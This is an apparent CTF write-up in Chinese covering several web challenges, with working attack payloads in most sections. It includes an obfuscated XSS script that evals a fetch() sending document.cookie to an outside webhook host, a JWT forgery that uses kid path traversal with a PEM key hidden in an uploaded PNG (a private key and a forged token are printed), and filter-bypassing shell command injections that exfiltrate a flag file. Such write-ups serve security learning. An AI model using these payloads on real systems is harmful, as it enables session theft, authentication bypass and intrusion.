
# web
### b01ler-ad
post `/review`接口,会有一个浏览器来访问http://localhost:3000/admin/view?content?=${content}
,发送一个html文档,

过滤了' " \` 使用String.fromCharCode绕过
 应该是xss读cookie,就是直接发个html,fetch,注意加个no-cors,不然无法跨域

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>upload</title>
</head>
<body>
<script>
eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,97,50,48,99,57,102,57,100,45,98,53,48,54,45,52,97,56,97,45,57,51,100,97,45,99,101,53,52,102,100,56,55,100,48,54,97,39,44,123,109,101,116,104,111,100,58,39,80,79,83,84,39,44,109,111,100,101,58,39,110,111,45,99,111,114,115,39,44,98,111,100,121,58,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,41))</script>

</body>
</html>
```
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413232240.png)

### imagehost
flag在上传的png里,登录为admin即可
`FLAG_FILENAME="$(python3 -c 'import uuid;print(uuid.uuid4())').png"`

Route("/", home),   主页,jwt鉴权,给出当前用户所有上传的照片
Route("/login", login_get), 返回login.html,jinjia2渲染无ssti
Route("/login", login, methods=["POST"]),    传入用户名/密码,fetchone,设置jwt里userid和admin
Route("/register", register_get),             register.html
Route("/register", register, methods=["POST"]),   insert,参数化
Route("/logout", logout),                  
Route("/", upload, methods=["POST"]),        上传文件,
Route("/view/{filename}", view),   
```python
async def view(request):
	filename = request.path_params["filename"]
	
	path = UPLOAD_FOLDER.joinpath("a").with_name(filename)
	if not path.exists():
		return PlainTextResponse("Image not found", 404)
	
	return FileResponse(UPLOAD_FOLDER.joinpath("a").with_name(filename))
```

需要伪造admin用户,使用的是非对称加密,且公钥(decode)的文件位置可指定,能否通过upload上传公钥文件,,且pem还要符合png的标准

我为我的无知道歉,pem的格式是这样的
```pem
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCT96Ir3DM+PtlpHqyI8YOBOKyAexIO5RMpwUgUndIRBs72g0Ga
Tyy8yxKbMCaJ2nLQBC9D6cOp8UzHBeirsk0rYETGQBFqHzOvjod3VjE+9eRMJGl7
oohwHUzqHUOoNDKLvz2HuoVtRHawfw4EHCx9OTNyWct7jjg9VV0EEz9IdQIDAQAB
AoGAbFR3kZ70kVTYPYLslJIlUj0Y5jO0Y91Iq2BLknR9MGQIsCgmpn/i5BHU/HND
M9gQCMWXiSQjUU9Ng8SKtPGkVsl22mNZkRb69Ca1083pI2HxwL3dhEXl+VLD37w+
Cg+9glWnsjdUFy8WoiTun0yWJHiXKN2VRCv759+vJS6M150CQQDDQt2HoKEKVsU1
RLyRpr93Idtmzplro48zsvsmuCZJyNnpn4VYz7BFvu7SDX4Xkz1dr9gELnTvnQY3
rBWNQOXzAkEAwf6jpDFa+JL9/CLLTxuwn51Or8C4zcd1LjrmsqWz8SYDnuAZo4Vg
A2MlVAYpbk1XfVWzGPxralsa9+Zrl9yp9wJATmQe2h+T57m0TNF+vx7pyWNPWTPi
hkNQ75mQmRffT0oSqmd/uosPIsEn0i7Wi5JyVZWOLQeVrMkmwN0WffIrHwJBAIM2
4Sil2YpYokJwpmOTrxvHIvntuRI23yOt42zid5ucwsYrfiwEgrTH0u/KWyuoVI0J
8mHsGhuOE+epiwzkzHECQCN3G0+GcCfE6eYF5yW19n7QoK3sxU5HbwXKoAeXgM0z
TEiGjWVM5w+Ea21IUsE2O2CIG1CePqUI2DSujYCo7Oc=
-----END RSA PRIVATE KEY-----
```
或者说view路由读取公钥文件?

实践出真知!!!,只要不破坏pem文件格式也可以解析
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414025437.png)

类似于图片马的制作,在一个图片中间把公钥加上去
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414035316.png)


照着原来的代码写一个加密,注意在linux上跑...
```python
import jwt
from pathlib import Path


payload={"user_id":1,"admin":True}

def encode(payload, public_key: Path, private_key: Path):
        key = private_key.read_bytes()
        return jwt.encode(payload=payload, key=key, algorithm="RS256", headers={"kid": str(public_key)})
print(encode(payload=payload,public_key=Path('../../../../../../uploads/2b170008-668c-4810-9b38-3815912a675b.png'),private_key=Path('/tmp/private.pem')))
```

output`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvMmIxNzAwMDgtNjY4Yy00ODEwLTliMzgtMzgxNTkxMmE2NzViLnBuZyJ9.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6dHJ1ZX0.fBuVTPsTuxKvVfpTUsi8qcDt07TqNZaORzH936DSgCT_xn5AtblipxDWKIHCbRRQyb1E2fwCQI7S9ORYNEb71PCrAHSop2akS084yIssIyVM3JGCVKpNrOvt-ta6Ua3TemAcpuI3Jx8jE_HTIot0rdBahS_DVXuZ8-NHn2YqIOo`

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414034815.png)



### 3-city-elves-writeups
命令注入,过滤了很多关键字

通过变量替换,先得到echo,使用base32 读取flag.png然后写入到静态文件style.css里
本地可以,远程不行
```json
{"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;a=ch;e${a}o 'aaaa'>> as*${b}sty* ;'\""}
```

```json
//变量b为/,然后base32读取根目录flag.png
{"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}proc${b}self${b}cmdline >> as*${b}sty* ;'\""}
```
sh不支持多级目录通配符...

```json
{"content":"1\"';e=se;b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}flag.png > as${e}ts${b}style ;'\""}
```

然后访问&下载/static/style 
`base32 -d style >flag.png`

![flag.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414174123.png)



`bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}`

### pwnhub

可以上传笔记内容,存在ssti
```python
@app.get('/view/<id>')
@login_required
def view(id):
    if (users[current_user.name].verification != V.admin):
        return render_template_string('This feature is still in development, please come back later.')
    content = next((post for post in current_user.posts if id in post), None)
    if not content:
        return render_template_string('Post not found')
    content = content.get(id, '')
    if any(char in content for char in INVALID):
        return render_template_string(f'1{"".join("33" for _ in range(len(content)))}7 detected')
    return render_template_string(f"Post contents here: {content[:250]}")
```
但是需要先是admin
```python
users = {
    "admin": User("admin", ''.join(choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(32)), V.admin),
    "pwnlyfans": User("pwnlyfans", ''.join(choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(32)), V.user)
}
```

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-04-13   22:21